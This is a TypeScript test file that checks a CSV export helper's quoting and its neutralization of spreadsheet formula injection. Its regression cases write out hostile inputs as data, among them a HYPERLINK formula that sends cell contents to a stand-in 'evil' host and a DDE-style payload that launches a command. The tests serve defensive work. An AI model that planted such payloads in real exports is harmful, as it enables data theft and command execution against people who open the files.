import { describe, it, expect } from "vitest";
import { csvCell, FORMULA_TRIGGERS } from "./csvSafety";

describe("csvCell", () => {
  it("wraps a plain string in double quotes", () => {
    expect(csvCell("hello")).toBe('"hello"');
  });

  it("doubles up embedded double quotes (RFC 4180)", () => {
    expect(csvCell('he said "hi"')).toBe('"he said ""hi"""');
  });

  it("returns an empty quoted cell for null / undefined", () => {
    expect(csvCell(null)).toBe('""');
    expect(csvCell(undefined)).toBe('""');
  });

  it("coerces numbers + booleans to strings", () => {
    expect(csvCell(42)).toBe('"42"');
    expect(csvCell(true)).toBe('"true"');
    expect(csvCell(3.14)).toBe('"3.14"');
  });

  it("does NOT prefix-escape a cell that's safe", () => {
    expect(csvCell("Apartment 4B")).toBe('"Apartment 4B"');
    expect(csvCell("Doe, John")).toBe('"Doe, John"');
  });

  // ── CSV formula-injection regression set ────────────────────────────
  // Each of these would execute as a formula in Excel/Sheets if we
  // didn't prefix them with a single quote. The exfil/RCE risk is
  // real — tenant-notes / partner-email / any user-controlled text
  // that flows into the analytics export.

  it("neutralizes leading = (HYPERLINK exfil + arbitrary formulas)", () => {
    expect(csvCell('=HYPERLINK("https://evil/?c="&A1)')).toMatch(/^"'=HYPERLINK/);
  });

  it("neutralizes leading + (Excel formula trigger)", () => {
    expect(csvCell("+SUM(A1:A2)")).toMatch(/^"'\+SUM/);
  });

  it("neutralizes leading - (negative-number → formula in Excel)", () => {
    expect(csvCell("-MIN(0,1)")).toMatch(/^"'-MIN/);
  });

  it("neutralizes leading @ (legacy Excel macro trigger)", () => {
    expect(csvCell("@SUM(1+1)*cmd|'/C calc'!A0")).toMatch(/^"'@SUM/);
  });

  it("neutralizes leading tab (formula in some Excel locales)", () => {
    expect(csvCell("\t=2+2")).toMatch(/^"'\t=2\+2"$/);
  });

  it("neutralizes leading carriage return", () => {
    expect(csvCell("\r=BAD()")).toMatch(/^"'\r=BAD\(\)"$/);
  });

  it("neutralizes leading backslash (Microsoft DDE in some locales)", () => {
    expect(csvCell("\\=DDE")).toMatch(/^"'\\=DDE"$/);
  });

  it("does NOT prefix mid-string triggers (only leading char matters)", () => {
    expect(csvCell("apt =123")).toBe('"apt =123"');
    expect(csvCell("Doe+Jane")).toBe('"Doe+Jane"');
    expect(csvCell("email@example.com")).toBe('"email@example.com"');
  });

  it("regex anchors at start: `=` triggers but ` =` does not", () => {
    expect(FORMULA_TRIGGERS.test("=foo")).toBe(true);
    expect(FORMULA_TRIGGERS.test(" =foo")).toBe(false);
  });

  it("handles formula payload that ALSO contains quotes — both protections apply", () => {
    // Both prefix-escape + double-quote escape fire together.
    const payload = `=HYPERLINK("https://evil/")`;
    const out = csvCell(payload);
    expect(out.startsWith(`"'=HYPERLINK(`)).toBe(true);
    expect(out.includes('""https://evil/""')).toBe(true);
  });
});
